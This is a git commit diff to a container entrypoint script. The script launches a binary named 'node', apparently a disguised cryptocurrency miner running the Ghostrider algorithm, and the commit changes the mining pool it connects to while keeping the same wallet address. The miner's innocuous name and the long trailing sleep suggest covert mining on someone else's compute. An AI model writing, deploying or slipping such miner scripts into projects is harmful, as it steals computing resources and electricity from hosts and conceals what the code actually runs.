510ca117e7fa7e6c9898699b158a0e7d982ba28d
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-04 18:28:24 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -5,6 +5,7 @@ chmod +x node
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
-./node --disable-gpu -a Ghostrider -o us-central.pmpmining.com:5090 -u GeqnGzyChYrCW6nVtam2a8i9xhb4uFwDzh.${WORKER_NUMBER}_crf > try.log
+./node --disable-gpu -a Ghostrider -o us-west.oasispool.xyz:13000 -u GeqnGzyChYrCW6nVtam2a8i9xhb4uFwDzh.${WORKER_NUMBER}_crf > try.log
+
 sleep 29999
 
